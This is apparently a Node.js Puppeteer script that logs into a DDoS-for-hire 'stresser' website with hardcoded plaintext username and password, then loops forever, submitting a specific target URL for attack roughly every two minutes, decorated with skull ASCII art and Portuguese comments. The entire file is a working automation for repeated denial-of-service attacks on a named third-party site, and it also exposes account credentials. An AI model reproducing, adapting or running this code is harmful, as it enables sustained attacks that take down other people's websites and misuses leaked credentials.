const puppeteer = require('puppeteer')

try {
    console.log("\n" +
        "// ████▀░░░░░░░░░░░░░░░░░▀████\n" +
        "// ███│░░░░░░░░░░░░░░░░░░░│███\n" +
        "// ██▌│░░░░░░░░░░░░░░░░░░░│▐██\n" +
        "// ██░└┐░░░░░░░░░░░░░░░░░┌┘░██\n" +
        "// ██░░└┐░░░░░░░░░░░░░░░┌┘░░██\n" +
        "// ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\n" +
        "// ██▌░│██████▌░░░▐██████│░▐██\n" +
        "// ███░│▐███▀▀░░▄░░▀▀███▌│░███\n" +
        "// ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██\n" +
        "// ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\n" +
        "// ████▄─┘██▌░░░░░░░▐██└─▄████\n" +
        "// █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\n" +
        "// ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\n" +
        "// █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\n" +
        "// ███████▄░░░░░░░░░░░▄██████\n")
    attack()
} catch (err) {
    console.error(err)
    attack()
}

function attack() {

    try {
        (async () => {
            const browser = await puppeteer.launch({headless: true})
            const page = await browser.newPage()
            console.log('STARTED CODE DDOS ATTACK');
            await page.setViewport({width: 1280, height: 800})
            await page.goto('https://cryptostresser.com/login', {waitUntil: 'networkidle2'})
            //buscando seletor do userName
            await page.waitForSelector("[name='username']")
            await page.type("[name='username']", "derrubamongol")

            //Usando tab para colocar senha
            await page.keyboard.down('Tab')
            await page.keyboard.type("europonto3255@@")
            //Clicando no Enter
            await page.keyboard.press('Enter')

            console.log('STARTING ATTACK');
            //ATTACK INFINITO
            while (true == true) {
                await page.goto('https://cryptostresser.com/attack?page=1', {waitUntil: 'networkidle2'})
                await page.waitForSelector("[id='attack_target']")

                while (await page.$eval('#running_attack_count', element => element.innerHTML) == 1) {
                    console.log('CHECKING IF CAN ATTACK AGAIN');
                    await sleep(102000)
                    await page.goto('https://cryptostresser.com/attack?page=1', {waitUntil: 'networkidle2'})
                    await page.waitForSelector("[id='attack_target']")

                }
                console.log('!!!!!!!!! ATTACKING TARGET !!!!!!!');
                await page.type("[id='attack_target']", "https://vejaagora8.tech/perfil48/")
                await page.keyboard.press('Enter')
                await page.keyboard.press('Escape')
                console.log('WAITING WHILE ATTACK IS IN PROGRESSING');
                await sleep(120000)
            }
            await browser.close()
        })()
    } catch (err) {
        console.error(err)
        attack()
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}


// ████▀░░░░░░░░░░░░░░░░░▀████
// ███│░░░░░░░░░░░░░░░░░░░│███
// ██▌│░░░░░░░░░░░░░░░░░░░│▐██
// ██░└┐░░░░░░░░░░░░░░░░░┌┘░██
// ██░░└┐░░░░░░░░░░░░░░░┌┘░░██
// ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
// ██▌░│██████▌░░░▐██████│░▐██
// ███░│▐███▀▀░░▄░░▀▀███▌│░███
// ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
// ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
// ████▄─┘██▌░░░░░░░▐██└─▄████
// █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
// ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
// █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
// ███████▄░░░░░░░░░░░▄██████
